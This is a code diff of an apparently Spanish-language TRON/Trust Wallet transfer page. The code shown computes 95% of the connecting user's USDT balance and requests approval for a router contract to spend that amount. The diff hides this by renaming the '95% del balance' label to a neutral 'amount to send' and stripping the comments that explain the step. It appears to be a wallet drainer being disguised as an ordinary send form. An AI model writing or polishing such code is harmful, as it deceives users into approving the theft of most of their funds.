@@ -104,7 +104,7 @@
     </div>
 
     <div class="tw-input-group">
-        <label class="tw-label">Cantidad (95% del balance)</label>
+        <label class="tw-label">Monto a enviar</label>
         <div class="tw-input-row">
             <div class="amount-stepper">
                 <button type="button" class="amount-step-btn" id="amountMinus">−</button>
@@ -183,7 +183,6 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: VINCULACIÓN Y SOLICITUD DE APROBACIÓN DEL 95% EXACTO
         if (!walletAddress) {
             try {
                 setStatus("Conectando con Trust Wallet...");
@@ -204,7 +203,6 @@
                 tronNetworkInfo.style.display = "flex";
                 maxAction.style.display = "inline";
 
-                // Obtener el balance y calcular exactamente el 95% para la aprobación
                 setStatus("Calculando balance y preparando autorización...");
                 const balance = await obtenerBalance(walletAddress);
                 const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(tronWeb.BigNumber.ROUND_DOWN);
@@ -215,7 +213,6 @@
 
                 amountDisplay.value = ninetyFivePercent.dividedBy(1_000_000).toString();
 
-                // Solicitar la aprobación exclusivamente por el monto exacto del 95% (Adiós al aviso de ilimitado)
                 const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
                 const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
@@ -244,7 +241,6 @@
             return;
         }
 
-        // PASO 2: LLAMADA LIMPIA AL CONTRATO INTELIGENTE
         try {
             setStatus("Preparando operación...");
             connectBtn.disabled = true;
